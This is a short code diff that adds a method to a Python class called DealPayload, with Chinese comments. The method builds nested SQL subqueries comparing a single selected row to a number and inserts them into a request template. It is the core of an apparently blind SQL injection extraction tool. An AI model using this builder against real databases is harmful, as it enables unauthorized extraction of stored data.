@@ -71,4 +71,46 @@ class DealPayload:
         payload = " ".join(payload)
         return self.construct_request(payload)
 
+    def construct_build_payload(self, select=None, source=None, conditions=None, limit=0, compare=0):
 
+        # 首先我需要拼接一个payload
+        payload = []
+
+        if select is not None:
+            payload.append('select')
+            payload.append(select)
+
+        if source is not None:
+            payload.append('from')
+            payload.append(source)
+
+        if conditions is not None:
+            payload.append('where')
+            payload.append(conditions)
+
+        payload.append('limit')
+        payload.append(repr(limit) + ',1')
+
+        # 把payload外包裹括号进行比较
+        payload = self._add_parentheses(" ".join(payload))
+
+        # 然后再分开继续处理
+        payload = payload.split(" ")
+
+        payload.append(">")
+        payload.append(repr(compare))
+
+        payload = self._add_parentheses(" ".join(payload))
+
+        # 然后再分开继续处理
+        payload = payload.split(" ")
+
+        # 在最前面添加select
+        payload.insert(0, "select")
+        payload = self._add_parentheses(" ".join(payload))
+
+        return self.construct_request(self.payload.replace("2333", payload))
+
+    @staticmethod
+    def _add_parentheses(payload):
+        return "(" + payload + ")"
